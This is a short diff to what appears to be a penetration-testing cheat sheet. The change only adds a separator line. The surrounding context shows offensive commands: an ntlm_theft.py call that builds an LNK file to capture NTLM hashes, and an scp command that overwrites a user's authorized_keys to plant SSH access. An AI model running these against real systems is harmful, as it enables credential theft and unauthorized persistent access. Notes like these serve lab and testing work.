@@ -223,6 +223,7 @@ vncviewer 192.168.0.10:1
 python3 ntlm_theft.py -g lnk -s <ip> -f vault
 ```
 - https://github.com/Greenwolf/ntlm_theft
+---
 # scp
 ```bash
 scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
